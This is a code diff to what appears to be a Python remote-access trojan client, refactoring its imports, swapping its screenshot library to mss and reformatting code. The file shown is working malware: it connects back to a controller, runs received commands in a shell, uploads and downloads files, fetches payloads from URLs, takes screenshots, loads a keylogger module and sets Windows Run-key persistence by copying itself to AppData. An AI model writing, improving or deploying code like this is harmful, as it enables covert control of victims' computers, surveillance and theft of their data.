@@ -3,17 +3,26 @@ import json
 import subprocess
 import time
 import os
-import pyautogui    #dependency # pip install pyautogui #mss is faster alternative
-import keylogger
 import threading
 import shutil
 import sys
-import requests
 from sys import platform
+
+# External dependencies
+from mss import mss
+import requests
+
+# Local dependencies
+import keylogger
+# from mss import mss # mss v6.1.0
+# import requests # v2.28.0
+
+
 
 def reliable_send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
+
 
 def reliable_recv():
     data = ''
@@ -23,6 +32,7 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+
 
 def download_file(file_name):
     f = open(file_name, 'wb')
@@ -37,9 +47,11 @@ def download_file(file_name):
     s.settimeout(None)
     f.close()
 
+
 def upload_file(file_name):
     f = open(file_name, 'rb')
     s.send(f.read())
+
 
 def download_url(url):
     get_response = requests.get(url)
@@ -47,21 +59,33 @@ def download_url(url):
     with open(file_name, 'wb') as out_file:
         out_file.write(get_response.content)
 
+
 def screenshot():
-    myScreenshot = pyautogui.screenshot()
-    myScreenshot.save('.screen.png')
+    if platform == "win32" or platform == "darwin":
+        with mss() as screen:
+            filename = screen.shot()
+            os.rename(filename, '.screen.png')
+    elif platform == "linux" or platform == "linux2":
+        with mss(display=":0.0") as screen:
+            filename = screen.shot()
+            os.rename(filename, '.screen.png')
+
+# TODO: screenshot other monitors
 
 def persist(reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
     try:
         if not os.path.exists(file_location):
             shutil.copyfile(sys.executable, file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
+                shell=True)
             reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
         else:
             reliable_send('[+] Persistence Already Exists')
     except:
         reliable_send('[-] Error Creating Persistence With The Target Machine')
+
 
 def is_admin():
     global admin
@@ -72,28 +96,29 @@ def is_admin():
             admin = '[!!] User Privileges!'
         else:
             admin = '[+] Administrator Privileges!'
-    elif platform == "linux" or platform == "linux2" or platform == "darwin": 
+    elif platform == "linux" or platform == "linux2" or platform == "darwin":
         pass
-        #TO BE DONE
+        # TO BE DONE
+
 
 def shell():
     while True:
         command = reliable_recv()
         if command == 'quit':
             break
-        elif command == 'background':   #BEGIN
+        elif command == 'background':  # BEGIN
             pass
-        elif command == 'help':         #ideally to be removed
+        elif command == 'help':  # ideally to be removed
             pass
         elif command == 'clear':
-            pass                        #END
+            pass  # END
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
         elif command[:6] == 'upload':
             download_file(command[7:])
         elif command[:8] == 'download':
             upload_file(command[9:])
-        elif command[:3] == 'get': 
+        elif command[:3] == 'get':
             try:
                 download_url(command[4:])
                 reliable_send('[+] Downloaded File From Specified URL!')
@@ -119,7 +144,8 @@ def shell():
             reg_name, copy_name = command[12:].split(' ')
             persist(reg_name, copy_name)
         elif command[:7] == 'sendall':
-            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                             stdin=subprocess.PIPE)
         elif command[:5] == 'check':
             try:
                 is_admin()
@@ -133,10 +159,12 @@ def shell():
             except:
                 reliable_send('[-] Failed to start!')
         else:
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
             reliable_send(result)
+
 
 def connection():
     while True:
@@ -150,6 +178,7 @@ def connection():
             break
         except:
             connection()
-            
+
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
